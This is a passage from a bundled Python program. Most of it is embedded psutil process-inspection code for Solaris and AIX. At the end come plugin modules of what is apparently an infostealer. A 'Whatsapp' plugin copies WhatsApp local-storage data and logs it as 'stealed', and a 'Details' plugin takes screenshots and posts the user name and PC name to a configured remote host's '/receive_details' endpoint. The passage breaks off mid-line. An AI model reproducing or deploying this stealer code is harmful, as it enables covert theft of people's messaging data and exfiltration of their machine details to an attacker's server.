fun(self, *args, **kwargs)\n        except (FileNotFoundError, ProcessLookupError):\n            # ENOENT (no such file or directory) gets raised on open().\n            # ESRCH (no such process) can get raised on read() if\n            # process is gone in meantime.\n            if not pid_exists(self.pid):\n                raise NoSuchProcess(self.pid, self._name)\n            else:\n                raise ZombieProcess(self.pid, self._name, self._ppid)\n        except PermissionError:\n            raise AccessDenied(self.pid, self._name)\n        except OSError:\n            if self.pid == 0:\n                if 0 in pids():\n                    raise AccessDenied(self.pid, self._name)\n                else:\n                    raise\n            raise\n    return wrapper\n\n\nclass Process(object):\n    """Wrapper class around underlying C implementation."""\n\n    __slots__ = ["pid", "_name", "_ppid", "_procfs_path", "_cache"]\n\n    def __init__(self, pid):\n        self.pid = pid\n        self._name = None\n        self._ppid = None\n        self._procfs_path = get_procfs_path()\n\n    def _assert_alive(self):\n        """Raise NSP if the process disappeared on us."""\n        # For those C function who do not raise NSP, possibly returning\n        # incorrect or incomplete result.\n        os.stat(\'%s/%s\' % (self._procfs_path, self.pid))\n\n    def oneshot_enter(self):\n        self._proc_name_and_args.cache_activate(self)\n        self._proc_basic_info.cache_activate(self)\n        self._proc_cred.cache_activate(self)\n\n    def oneshot_exit(self):\n        self._proc_name_and_args.cache_deactivate(self)\n        self._proc_basic_info.cache_deactivate(self)\n        self._proc_cred.cache_deactivate(self)\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _proc_name_and_args(self):\n        return cext.proc_name_and_args(self.pid, self._procfs_path)\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _proc_basic_info(self):\n        if self.pid == 0 and not \\\n                os.path.exists(\'%s/%s/psinfo\' % (self._procfs_path, self.pid)):\n            raise AccessDenied(self.pid)\n        ret = cext.proc_basic_info(self.pid, self._procfs_path)\n        assert len(ret) == len(proc_info_map)\n        return ret\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _proc_cred(self):\n        return cext.proc_cred(self.pid, self._procfs_path)\n\n    @wrap_exceptions\n    def name(self):\n        # note: max len == 15\n        return self._proc_name_and_args()[0]\n\n    @wrap_exceptions\n    def exe(self):\n        try:\n            return os.readlink(\n                "%s/%s/path/a.out" % (self._procfs_path, self.pid))\n        except OSError:\n            pass    # continue and guess the exe name from the cmdline\n        # Will be guessed later from cmdline but we want to explicitly\n        # invoke cmdline here in order to get an AccessDenied\n        # exception if the user has not enough privileges.\n        self.cmdline()\n        return ""\n\n    @wrap_exceptions\n    def cmdline(self):\n        return self._proc_name_and_args()[1].split(\' \')\n\n    @wrap_exceptions\n    def environ(self):\n        return cext.proc_environ(self.pid, self._procfs_path)\n\n    @wrap_exceptions\n    def create_time(self):\n        return self._proc_basic_info()[proc_info_map[\'create_time\']]\n\n    @wrap_exceptions\n    def num_threads(self):\n        return self._proc_basic_info()[proc_info_map[\'num_threads\']]\n\n    @wrap_exceptions\n    def nice_get(self):\n        # Note #1: getpriority(3) doesn\'t work for realtime processes.\n        # Psinfo is what ps uses, see:\n        # https://github.com/giampaolo/psutil/issues/1194\n        return self._proc_basic_info()[proc_info_map[\'nice\']]\n\n    @wrap_exceptions\n    def nice_set(self, value):\n        if self.pid in (2, 3):\n            # Special case PIDs: internally setpriority(3) return ESRCH\n            # (no such process), no matter what.\n            # The process actually exists though, as it has a name,\n            # creation time, etc.\n            raise AccessDenied(self.pid, self._name)\n        return cext_posix.setpriority(self.pid, value)\n\n    @wrap_exceptions\n    def ppid(self):\n        self._ppid = self._proc_basic_info()[proc_info_map[\'ppid\']]\n        return self._ppid\n\n    @wrap_exceptions\n    def uids(self):\n        try:\n            real, effective, saved, _, _, _ = self._proc_cred()\n        except AccessDenied:\n            real = self._proc_basic_info()[proc_info_map[\'uid\']]\n            effective = self._proc_basic_info()[proc_info_map[\'euid\']]\n            saved = None\n        return _common.puids(real, effective, saved)\n\n    @wrap_exceptions\n    def gids(self):\n        try:\n            _, _, _, real, effective, saved = self._proc_cred()\n        except AccessDenied:\n            real = self._proc_basic_info()[proc_info_map[\'gid\']]\n            effective = self._proc_basic_info()[proc_info_map[\'egid\']]\n            saved = None\n        return _common.puids(real, effective, saved)\n\n    @wrap_exceptions\n    def cpu_times(self):\n        try:\n            times = cext.proc_cpu_times(self.pid, self._procfs_path)\n        except OSError as err:\n            if err.errno == errno.EOVERFLOW and not IS_64_BIT:\n                # We may get here if we attempt to query a 64bit process\n                # with a 32bit python.\n                # Error originates from read() and also tools like "cat"\n                # fail in the same way (!).\n                # Since there simply is no way to determine CPU times we\n                # return 0.0 as a fallback. See:\n                # https://github.com/giampaolo/psutil/issues/857\n                times = (0.0, 0.0, 0.0, 0.0)\n            else:\n                raise\n        return _common.pcputimes(*times)\n\n    @wrap_exceptions\n    def cpu_num(self):\n        return cext.proc_cpu_num(self.pid, self._procfs_path)\n\n    @wrap_exceptions\n    def terminal(self):\n        procfs_path = self._procfs_path\n        hit_enoent = False\n        tty = wrap_exceptions(\n            self._proc_basic_info()[proc_info_map[\'ttynr\']])\n        if tty != cext.PRNODEV:\n            for x in (0, 1, 2, 255):\n                try:\n                    return os.readlink(\n                        \'%s/%d/path/%d\' % (procfs_path, self.pid, x))\n                except FileNotFoundError:\n                    hit_enoent = True\n                    continue\n        if hit_enoent:\n            self._assert_alive()\n\n    @wrap_exceptions\n    def cwd(self):\n        # /proc/PID/path/cwd may not be resolved by readlink() even if\n        # it exists (ls shows it). If that\'s the case and the process\n        # is still alive return None (we can return None also on BSD).\n        # Reference: http://goo.gl/55XgO\n        procfs_path = self._procfs_path\n        try:\n            return os.readlink("%s/%s/path/cwd" % (procfs_path, self.pid))\n        except FileNotFoundError:\n            os.stat("%s/%s" % (procfs_path, self.pid))  # raise NSP or AD\n            return None\n\n    @wrap_exceptions\n    def memory_info(self):\n        ret = self._proc_basic_info()\n        rss = ret[proc_info_map[\'rss\']] * 1024\n        vms = ret[proc_info_map[\'vms\']] * 1024\n        return pmem(rss, vms)\n\n    memory_full_info = memory_info\n\n    @wrap_exceptions\n    def status(self):\n        code = self._proc_basic_info()[proc_info_map[\'status\']]\n        # XXX is \'?\' legit? (we\'re not supposed to return it anyway)\n        return PROC_STATUSES.get(code, \'?\')\n\n    @wrap_exceptions\n    def threads(self):\n        procfs_path = self._procfs_path\n        ret = []\n        tids = os.listdir(\'%s/%d/lwp\' % (procfs_path, self.pid))\n        hit_enoent = False\n        for tid in tids:\n            tid = int(tid)\n            try:\n                utime, stime = cext.query_process_thread(\n                    self.pid, tid, procfs_path)\n            except EnvironmentError as err:\n                if err.errno == errno.EOVERFLOW and not IS_64_BIT:\n                    # We may get here if we attempt to query a 64bit process\n                    # with a 32bit python.\n                    # Error originates from read() and also tools like "cat"\n                    # fail in the same way (!).\n                    # Since there simply is no way to determine CPU times we\n                    # return 0.0 as a fallback. See:\n                    # https://github.com/giampaolo/psutil/issues/857\n                    continue\n                # ENOENT == thread gone in meantime\n                if err.errno == errno.ENOENT:\n                    hit_enoent = True\n                    continue\n                raise\n            else:\n                nt = _common.pthread(tid, utime, stime)\n                ret.append(nt)\n        if hit_enoent:\n            self._assert_alive()\n        return ret\n\n    @wrap_exceptions\n    def open_files(self):\n        retlist = []\n        hit_enoent = False\n        procfs_path = self._procfs_path\n        pathdir = \'%s/%d/path\' % (procfs_path, self.pid)\n        for fd in os.listdir(\'%s/%d/fd\' % (procfs_path, self.pid)):\n            path = os.path.join(pathdir, fd)\n            if os.path.islink(path):\n                try:\n                    file = os.readlink(path)\n                except FileNotFoundError:\n                    hit_enoent = True\n                    continue\n                else:\n                    if isfile_strict(file):\n                        retlist.append(_common.popenfile(file, int(fd)))\n        if hit_enoent:\n            self._assert_alive()\n        return retlist\n\n    def _get_unix_sockets(self, pid):\n        """Get UNIX sockets used by process by parsing \'pfiles\' output."""\n        # TODO: rewrite this in C (...but the damn netstat source code\n        # does not include this part! Argh!!)\n        cmd = "pfiles %s" % pid\n        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,\n                             stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n        if PY3:\n            stdout, stderr = [x.decode(sys.stdout.encoding)\n                              for x in (stdout, stderr)]\n        if p.returncode != 0:\n            if \'permission denied\' in stderr.lower():\n                raise AccessDenied(self.pid, self._name)\n            if \'no such process\' in stderr.lower():\n                raise NoSuchProcess(self.pid, self._name)\n            raise RuntimeError("%r command error\\n%s" % (cmd, stderr))\n\n        lines = stdout.split(\'\\n\')[2:]\n        for i, line in enumerate(lines):\n            line = line.lstrip()\n            if line.startswith(\'sockname: AF_UNIX\'):\n                path = line.split(\' \', 2)[2]\n                type = lines[i - 2].strip()\n                if type == \'SOCK_STREAM\':\n                    type = socket.SOCK_STREAM\n                elif type == \'SOCK_DGRAM\':\n                    type = socket.SOCK_DGRAM\n                else:\n                    type = -1\n                yield (-1, socket.AF_UNIX, type, path, "", _common.CONN_NONE)\n\n    @wrap_exceptions\n    def connections(self, kind=\'inet\'):\n        ret = net_connections(kind, _pid=self.pid)\n        # The underlying C implementation retrieves all OS connections\n        # and filters them by PID.  At this point we can\'t tell whether\n        # an empty list means there were no connections for process or\n        # process is no longer active so we force NSP in case the PID\n        # is no longer there.\n        if not ret:\n            # will raise NSP if process is gone\n            os.stat(\'%s/%s\' % (self._procfs_path, self.pid))\n\n        # UNIX sockets\n        if kind in (\'all\', \'unix\'):\n            ret.extend([_common.pconn(*conn) for conn in\n                        self._get_unix_sockets(self.pid)])\n        return ret\n\n    nt_mmap_grouped = namedtuple(\'mmap\', \'path rss anon locked\')\n    nt_mmap_ext = namedtuple(\'mmap\', \'addr perms path rss anon locked\')\n\n    @wrap_exceptions\n    def memory_maps(self):\n        def toaddr(start, end):\n            return \'%s-%s\' % (hex(start)[2:].strip(\'L\'),\n                              hex(end)[2:].strip(\'L\'))\n\n        procfs_path = self._procfs_path\n        retlist = []\n        try:\n            rawlist = cext.proc_memory_maps(self.pid, procfs_path)\n        except OSError as err:\n            if err.errno == errno.EOVERFLOW and not IS_64_BIT:\n                # We may get here if we attempt to query a 64bit process\n                # with a 32bit python.\n                # Error originates from read() and also tools like "cat"\n                # fail in the same way (!).\n                # Since there simply is no way to determine CPU times we\n                # return 0.0 as a fallback. See:\n                # https://github.com/giampaolo/psutil/issues/857\n                return []\n            else:\n                raise\n        hit_enoent = False\n        for item in rawlist:\n            addr, addrsize, perm, name, rss, anon, locked = item\n            addr = toaddr(addr, addrsize)\n            if not name.startswith(\'[\'):\n                try:\n                    name = os.readlink(\n                        \'%s/%s/path/%s\' % (procfs_path, self.pid, name))\n                except OSError as err:\n                    if err.errno == errno.ENOENT:\n                        # sometimes the link may not be resolved by\n                        # readlink() even if it exists (ls shows it).\n                        # If that\'s the case we just return the\n                        # unresolved link path.\n                        # This seems an incosistency with /proc similar\n                        # to: http://goo.gl/55XgO\n                        name = \'%s/%s/path/%s\' % (procfs_path, self.pid, name)\n                        hit_enoent = True\n                    else:\n                        raise\n            retlist.append((addr, perm, name, rss, anon, locked))\n        if hit_enoent:\n            self._assert_alive()\n        return retlist\n\n    @wrap_exceptions\n    def num_fds(self):\n        return len(os.listdir("%s/%s/fd" % (self._procfs_path, self.pid)))\n\n    @wrap_exceptions\n    def num_ctx_switches(self):\n        return _common.pctxsw(\n            *cext.proc_num_ctx_switches(self.pid, self._procfs_path))\n\n    @wrap_exceptions\n    def wait(self, timeout=None):\n        return _psposix.wait_pid(self.pid, timeout, self._name)\n')
    __stickytape_write_module('psutil/_psaix.py', b'# Copyright (c) 2009, Giampaolo Rodola\'\n# Copyright (c) 2017, Arnon Yaari\n# All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""AIX platform implementation."""\n\nimport functools\nimport glob\nimport os\nimport re\nimport subprocess\nimport sys\nfrom collections import namedtuple\n\nfrom . import _common\nfrom . import _psposix\nfrom . import _psutil_aix as cext\nfrom . import _psutil_posix as cext_posix\nfrom ._common import NIC_DUPLEX_FULL\nfrom ._common import NIC_DUPLEX_HALF\nfrom ._common import NIC_DUPLEX_UNKNOWN\nfrom ._common import AccessDenied\nfrom ._common import NoSuchProcess\nfrom ._common import ZombieProcess\nfrom ._common import conn_to_ntuple\nfrom ._common import get_procfs_path\nfrom ._common import memoize_when_activated\nfrom ._common import usage_percent\nfrom ._compat import PY3\nfrom ._compat import FileNotFoundError\nfrom ._compat import PermissionError\nfrom ._compat import ProcessLookupError\n\n\n__extra__all__ = ["PROCFS_PATH"]\n\n\n# =====================================================================\n# --- globals\n# =====================================================================\n\n\nHAS_THREADS = hasattr(cext, "proc_threads")\nHAS_NET_IO_COUNTERS = hasattr(cext, "net_io_counters")\nHAS_PROC_IO_COUNTERS = hasattr(cext, "proc_io_counters")\n\nPAGE_SIZE = cext_posix.getpagesize()\nAF_LINK = cext_posix.AF_LINK\n\nPROC_STATUSES = {\n    cext.SIDL: _common.STATUS_IDLE,\n    cext.SZOMB: _common.STATUS_ZOMBIE,\n    cext.SACTIVE: _common.STATUS_RUNNING,\n    cext.SSWAP: _common.STATUS_RUNNING,      # TODO what status is this?\n    cext.SSTOP: _common.STATUS_STOPPED,\n}\n\nTCP_STATUSES = {\n    cext.TCPS_ESTABLISHED: _common.CONN_ESTABLISHED,\n    cext.TCPS_SYN_SENT: _common.CONN_SYN_SENT,\n    cext.TCPS_SYN_RCVD: _common.CONN_SYN_RECV,\n    cext.TCPS_FIN_WAIT_1: _common.CONN_FIN_WAIT1,\n    cext.TCPS_FIN_WAIT_2: _common.CONN_FIN_WAIT2,\n    cext.TCPS_TIME_WAIT: _common.CONN_TIME_WAIT,\n    cext.TCPS_CLOSED: _common.CONN_CLOSE,\n    cext.TCPS_CLOSE_WAIT: _common.CONN_CLOSE_WAIT,\n    cext.TCPS_LAST_ACK: _common.CONN_LAST_ACK,\n    cext.TCPS_LISTEN: _common.CONN_LISTEN,\n    cext.TCPS_CLOSING: _common.CONN_CLOSING,\n    cext.PSUTIL_CONN_NONE: _common.CONN_NONE,\n}\n\nproc_info_map = dict(\n    ppid=0,\n    rss=1,\n    vms=2,\n    create_time=3,\n    nice=4,\n    num_threads=5,\n    status=6,\n    ttynr=7)\n\n\n# =====================================================================\n# --- named tuples\n# =====================================================================\n\n\n# psutil.Process.memory_info()\npmem = namedtuple(\'pmem\', [\'rss\', \'vms\'])\n# psutil.Process.memory_full_info()\npfullmem = pmem\n# psutil.Process.cpu_times()\nscputimes = namedtuple(\'scputimes\', [\'user\', \'system\', \'idle\', \'iowait\'])\n# psutil.virtual_memory()\nsvmem = namedtuple(\'svmem\', [\'total\', \'available\', \'percent\', \'used\', \'free\'])\n\n\n# =====================================================================\n# --- memory\n# =====================================================================\n\n\ndef virtual_memory():\n    total, avail, free, pinned, inuse = cext.virtual_mem()\n    percent = usage_percent((total - avail), total, round_=1)\n    return svmem(total, avail, percent, inuse, free)\n\n\ndef swap_memory():\n    """Swap system memory as a (total, used, free, sin, sout) tuple."""\n    total, free, sin, sout = cext.swap_mem()\n    used = total - free\n    percent = usage_percent(used, total, round_=1)\n    return _common.sswap(total, used, free, percent, sin, sout)\n\n\n# =====================================================================\n# --- CPU\n# =====================================================================\n\n\ndef cpu_times():\n    """Return system-wide CPU times as a named tuple"""\n    ret = cext.per_cpu_times()\n    return scputimes(*[sum(x) for x in zip(*ret)])\n\n\ndef per_cpu_times():\n    """Return system per-CPU times as a list of named tuples"""\n    ret = cext.per_cpu_times()\n    return [scputimes(*x) for x in ret]\n\n\ndef cpu_count_logical():\n    """Return the number of logical CPUs in the system."""\n    try:\n        return os.sysconf("SC_NPROCESSORS_ONLN")\n    except ValueError:\n        # mimic os.cpu_count() behavior\n        return None\n\n\ndef cpu_count_cores():\n    cmd = "lsdev -Cc processor"\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    stdout, stderr = p.communicate()\n    if PY3:\n        stdout, stderr = [x.decode(sys.stdout.encoding)\n                          for x in (stdout, stderr)]\n    if p.returncode != 0:\n        raise RuntimeError("%r command error\\n%s" % (cmd, stderr))\n    processors = stdout.strip().splitlines()\n    return len(processors) or None\n\n\ndef cpu_stats():\n    """Return various CPU stats as a named tuple."""\n    ctx_switches, interrupts, soft_interrupts, syscalls = cext.cpu_stats()\n    return _common.scpustats(\n        ctx_switches, interrupts, soft_interrupts, syscalls)\n\n\n# =====================================================================\n# --- disks\n# =====================================================================\n\n\ndisk_io_counters = cext.disk_io_counters\ndisk_usage = _psposix.disk_usage\n\n\ndef disk_partitions(all=False):\n    """Return system disk partitions."""\n    # TODO - the filtering logic should be better checked so that\n    # it tries to reflect \'df\' as much as possible\n    retlist = []\n    partitions = cext.disk_partitions()\n    for partition in partitions:\n        device, mountpoint, fstype, opts = partition\n        if device == \'none\':\n            device = \'\'\n        if not all:\n            # Differently from, say, Linux, we don\'t have a list of\n            # common fs types so the best we can do, AFAIK, is to\n            # filter by filesystem having a total size > 0.\n            if not disk_usage(mountpoint).total:\n                continue\n        maxfile = maxpath = None  # set later\n        ntuple = _common.sdiskpart(device, mountpoint, fstype, opts,\n                                   maxfile, maxpath)\n        retlist.append(ntuple)\n    return retlist\n\n\n# =====================================================================\n# --- network\n# =====================================================================\n\n\nnet_if_addrs = cext_posix.net_if_addrs\n\nif HAS_NET_IO_COUNTERS:\n    net_io_counters = cext.net_io_counters\n\n\ndef net_connections(kind, _pid=-1):\n    """Return socket connections.  If pid == -1 return system-wide\n    connections (as opposed to connections opened by one process only).\n    """\n    cmap = _common.conn_tmap\n    if kind not in cmap:\n        raise ValueError("invalid %r kind argument; choose between %s"\n                         % (kind, \', \'.join([repr(x) for x in cmap])))\n    families, types = _common.conn_tmap[kind]\n    rawlist = cext.net_connections(_pid)\n    ret = []\n    for item in rawlist:\n        fd, fam, type_, laddr, raddr, status, pid = item\n        if fam not in families:\n            continue\n        if type_ not in types:\n            continue\n        nt = conn_to_ntuple(fd, fam, type_, laddr, raddr, status,\n                            TCP_STATUSES, pid=pid if _pid == -1 else None)\n        ret.append(nt)\n    return ret\n\n\ndef net_if_stats():\n    """Get NIC stats (isup, duplex, speed, mtu)."""\n    duplex_map = {"Full": NIC_DUPLEX_FULL,\n                  "Half": NIC_DUPLEX_HALF}\n    names = set([x[0] for x in net_if_addrs()])\n    ret = {}\n    for name in names:\n        isup, mtu = cext.net_if_stats(name)\n\n        # try to get speed and duplex\n        # TODO: rewrite this in C (entstat forks, so use truss -f to follow.\n        # looks like it is using an undocumented ioctl?)\n        duplex = ""\n        speed = 0\n        p = subprocess.Popen(["/usr/bin/entstat", "-d", name],\n                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n        if PY3:\n            stdout, stderr = [x.decode(sys.stdout.encoding)\n                              for x in (stdout, stderr)]\n        if p.returncode == 0:\n            re_result = re.search(\n                r"Running: (\\d+) Mbps.*?(\\w+) Duplex", stdout)\n            if re_result is not None:\n                speed = int(re_result.group(1))\n                duplex = re_result.group(2)\n\n        duplex = duplex_map.get(duplex, NIC_DUPLEX_UNKNOWN)\n        ret[name] = _common.snicstats(isup, duplex, speed, mtu)\n    return ret\n\n\n# =====================================================================\n# --- other system functions\n# =====================================================================\n\n\ndef boot_time():\n    """The system boot time expressed in seconds since the epoch."""\n    return cext.boot_time()\n\n\ndef users():\n    """Return currently connected users as a list of namedtuples."""\n    retlist = []\n    rawlist = cext.users()\n    localhost = (\':0.0\', \':0\')\n    for item in rawlist:\n        user, tty, hostname, tstamp, user_process, pid = item\n        # note: the underlying C function includes entries about\n        # system boot, run level and others.  We might want\n        # to use them in the future.\n        if not user_process:\n            continue\n        if hostname in localhost:\n            hostname = \'localhost\'\n        nt = _common.suser(user, tty, hostname, tstamp, pid)\n        retlist.append(nt)\n    return retlist\n\n\n# =====================================================================\n# --- processes\n# =====================================================================\n\n\ndef pids():\n    """Returns a list of PIDs currently running on the system."""\n    return [int(x) for x in os.listdir(get_procfs_path()) if x.isdigit()]\n\n\ndef pid_exists(pid):\n    """Check for the existence of a unix pid."""\n    return os.path.exists(os.path.join(get_procfs_path(), str(pid), "psinfo"))\n\n\ndef wrap_exceptions(fun):\n    """Call callable into a try/except clause and translate ENOENT,\n    EACCES and EPERM in NoSuchProcess or AccessDenied exceptions.\n    """\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        try:\n            return fun(self, *args, **kwargs)\n        except (FileNotFoundError, ProcessLookupError):\n            # ENOENT (no such file or directory) gets raised on open().\n            # ESRCH (no such process) can get raised on read() if\n            # process is gone in meantime.\n            if not pid_exists(self.pid):\n                raise NoSuchProcess(self.pid, self._name)\n            else:\n                raise ZombieProcess(self.pid, self._name, self._ppid)\n        except PermissionError:\n            raise AccessDenied(self.pid, self._name)\n    return wrapper\n\n\nclass Process(object):\n    """Wrapper class around underlying C implementation."""\n\n    __slots__ = ["pid", "_name", "_ppid", "_procfs_path", "_cache"]\n\n    def __init__(self, pid):\n        self.pid = pid\n        self._name = None\n        self._ppid = None\n        self._procfs_path = get_procfs_path()\n\n    def oneshot_enter(self):\n        self._proc_basic_info.cache_activate(self)\n        self._proc_cred.cache_activate(self)\n\n    def oneshot_exit(self):\n        self._proc_basic_info.cache_deactivate(self)\n        self._proc_cred.cache_deactivate(self)\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _proc_basic_info(self):\n        return cext.proc_basic_info(self.pid, self._procfs_path)\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _proc_cred(self):\n        return cext.proc_cred(self.pid, self._procfs_path)\n\n    @wrap_exceptions\n    def name(self):\n        if self.pid == 0:\n            return "swapper"\n        # note: max 16 characters\n        return cext.proc_name(self.pid, self._procfs_path).rstrip("\\x00")\n\n    @wrap_exceptions\n    def exe(self):\n        # there is no way to get executable path in AIX other than to guess,\n        # and guessing is more complex than what\'s in the wrapping class\n        cmdline = self.cmdline()\n        if not cmdline:\n            return \'\'\n        exe = cmdline[0]\n        if os.path.sep in exe:\n            # relative or absolute path\n            if not os.path.isabs(exe):\n                # if cwd has changed, we\'re out of luck - this may be wrong!\n                exe = os.path.abspath(os.path.join(self.cwd(), exe))\n            if (os.path.isabs(exe) and\n                    os.path.isfile(exe) and\n                    os.access(exe, os.X_OK)):\n                return exe\n            # not found, move to search in PATH using basename only\n            exe = os.path.basename(exe)\n        # search for exe name PATH\n        for path in os.environ["PATH"].split(":"):\n            possible_exe = os.path.abspath(os.path.join(path, exe))\n            if (os.path.isfile(possible_exe) and\n                    os.access(possible_exe, os.X_OK)):\n                return possible_exe\n        return \'\'\n\n    @wrap_exceptions\n    def cmdline(self):\n        return cext.proc_args(self.pid)\n\n    @wrap_exceptions\n    def environ(self):\n        return cext.proc_environ(self.pid)\n\n    @wrap_exceptions\n    def create_time(self):\n        return self._proc_basic_info()[proc_info_map[\'create_time\']]\n\n    @wrap_exceptions\n    def num_threads(self):\n        return self._proc_basic_info()[proc_info_map[\'num_threads\']]\n\n    if HAS_THREADS:\n        @wrap_exceptions\n        def threads(self):\n            rawlist = cext.proc_threads(self.pid)\n            retlist = []\n            for thread_id, utime, stime in rawlist:\n                ntuple = _common.pthread(thread_id, utime, stime)\n                retlist.append(ntuple)\n            # The underlying C implementation retrieves all OS threads\n            # and filters them by PID.  At this point we can\'t tell whether\n            # an empty list means there were no connections for process or\n            # process is no longer active so we force NSP in case the PID\n            # is no longer there.\n            if not retlist:\n                # will raise NSP if process is gone\n                os.stat(\'%s/%s\' % (self._procfs_path, self.pid))\n            return retlist\n\n    @wrap_exceptions\n    def connections(self, kind=\'inet\'):\n        ret = net_connections(kind, _pid=self.pid)\n        # The underlying C implementation retrieves all OS connections\n        # and filters them by PID.  At this point we can\'t tell whether\n        # an empty list means there were no connections for process or\n        # process is no longer active so we force NSP in case the PID\n        # is no longer there.\n        if not ret:\n            # will raise NSP if process is gone\n            os.stat(\'%s/%s\' % (self._procfs_path, self.pid))\n        return ret\n\n    @wrap_exceptions\n    def nice_get(self):\n        return cext_posix.getpriority(self.pid)\n\n    @wrap_exceptions\n    def nice_set(self, value):\n        return cext_posix.setpriority(self.pid, value)\n\n    @wrap_exceptions\n    def ppid(self):\n        self._ppid = self._proc_basic_info()[proc_info_map[\'ppid\']]\n        return self._ppid\n\n    @wrap_exceptions\n    def uids(self):\n        real, effective, saved, _, _, _ = self._proc_cred()\n        return _common.puids(real, effective, saved)\n\n    @wrap_exceptions\n    def gids(self):\n        _, _, _, real, effective, saved = self._proc_cred()\n        return _common.puids(real, effective, saved)\n\n    @wrap_exceptions\n    def cpu_times(self):\n        cpu_times = cext.proc_cpu_times(self.pid, self._procfs_path)\n        return _common.pcputimes(*cpu_times)\n\n    @wrap_exceptions\n    def terminal(self):\n        ttydev = self._proc_basic_info()[proc_info_map[\'ttynr\']]\n        # convert from 64-bit dev_t to 32-bit dev_t and then map the device\n        ttydev = (((ttydev & 0x0000FFFF00000000) >> 16) | (ttydev & 0xFFFF))\n        # try to match rdev of /dev/pts/* files ttydev\n        for dev in glob.glob("/dev/**/*"):\n            if os.stat(dev).st_rdev == ttydev:\n                return dev\n        return None\n\n    @wrap_exceptions\n    def cwd(self):\n        procfs_path = self._procfs_path\n        try:\n            result = os.readlink("%s/%s/cwd" % (procfs_path, self.pid))\n            return result.rstrip(\'/\')\n        except FileNotFoundError:\n            os.stat("%s/%s" % (procfs_path, self.pid))  # raise NSP or AD\n            return None\n\n    @wrap_exceptions\n    def memory_info(self):\n        ret = self._proc_basic_info()\n        rss = ret[proc_info_map[\'rss\']] * 1024\n        vms = ret[proc_info_map[\'vms\']] * 1024\n        return pmem(rss, vms)\n\n    memory_full_info = memory_info\n\n    @wrap_exceptions\n    def status(self):\n        code = self._proc_basic_info()[proc_info_map[\'status\']]\n        # XXX is \'?\' legit? (we\'re not supposed to return it anyway)\n        return PROC_STATUSES.get(code, \'?\')\n\n    def open_files(self):\n        # TODO rewrite without using procfiles (stat /proc/pid/fd/* and then\n        # find matching name of the inode)\n        p = subprocess.Popen(["/usr/bin/procfiles", "-n", str(self.pid)],\n                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n        if PY3:\n            stdout, stderr = [x.decode(sys.stdout.encoding)\n                              for x in (stdout, stderr)]\n        if "no such process" in stderr.lower():\n            raise NoSuchProcess(self.pid, self._name)\n        procfiles = re.findall(r"(\\d+): S_IFREG.*\\s*.*name:(.*)\\n", stdout)\n        retlist = []\n        for fd, path in procfiles:\n            path = path.strip()\n            if path.startswith("//"):\n                path = path[1:]\n            if path.lower() == "cannot be retrieved":\n                continue\n            retlist.append(_common.popenfile(path, int(fd)))\n        return retlist\n\n    @wrap_exceptions\n    def num_fds(self):\n        if self.pid == 0:       # no /proc/0/fd\n            return 0\n        return len(os.listdir("%s/%s/fd" % (self._procfs_path, self.pid)))\n\n    @wrap_exceptions\n    def num_ctx_switches(self):\n        return _common.pctxsw(\n            *cext.proc_num_ctx_switches(self.pid))\n\n    @wrap_exceptions\n    def wait(self, timeout=None):\n        return _psposix.wait_pid(self.pid, timeout, self._name)\n\n    if HAS_PROC_IO_COUNTERS:\n        @wrap_exceptions\n        def io_counters(self):\n            try:\n                rc, wc, rb, wb = cext.proc_io_counters(self.pid)\n            except OSError:\n                # if process is terminated, proc_io_counters returns OSError\n                # instead of NSP\n                if not pid_exists(self.pid):\n                    raise NoSuchProcess(self.pid, self._name)\n                raise\n            return _common.pio(rc, wc, rb, wb)\n')
    __stickytape_write_module('plugins/whatsapp.py', b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copytree\r\n\r\n\r\n\r\nclass Whatsapp(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        folder = join(path, 'local storage', 'leveldb')\r\n\r\n        if not isdir(folder):\r\n            return\r\n        \r\n        whatsapp_res_folder = join(self.conf.log_path, 'whatsapp')\r\n\r\n        if not isdir(whatsapp_res_folder):\r\n            mkdir(whatsapp_res_folder)\r\n\r\n        res = join(whatsapp_res_folder, f'whatsapp_{token_hex(4)}')\r\n\r\n        await copytree(folder, res)\r\n\r\n        await self.conf.logger.log(f'Whatsapp stealed from {path}')")
    __stickytape_write_module('plugins/Details.py', b"from asyncio import create_task\r\nfrom config import Config\r\nimport os\r\nfrom os.path import join\r\nimport platform\r\nfrom aiofiles import open\r\nfrom mss.windows import MSS as mss\r\nfrom tools import move\r\n\r\n\r\n\r\nclass Details():\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def take_screenshot(self) -> None:\r\n        with mss() as sct:\r\n            for filename in sct.save():\r\n                await move(filename, join(self.conf.log_path, filename))\r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xba\xd1\x80\xd0\xb8\xd0\xbd\xd1\x88\xd0\xbe\xd1\x82 {filename} \xd1\x81\xd0\xbe\xd1\x85\xd1\x80\xd0\xb0\xd0\xbd\xd0\xb5\xd0\xbd')\r\n \r\n    async def callback(self) -> None:\r\n        bg_task = create_task(self.take_screenshot())\r\n        user = os.getlogin()\r\n        pc = platform.node()\r\n        tag = self.conf.tag\r\n\r\n        data = {\r\n            'client_id': self.conf.client_id,\r\n            'tag': tag,\r\n            'user_name': user,\r\n            'pc_name': pc\r\n        }\r\n        \r\n        url = f'{self.conf.host}/receive_details'\r\n\r\n        resp = await self.conf.session.post(url, json=data)\r\n\r\n        async with open(join(self.conf.log_path, 'details.txt'), 'w', encoding='utf8') as f:\r\n            await f.write(f'user name: {user}\\npc name: {pc}\\ntag: {tag}')\r\n\r\n        await 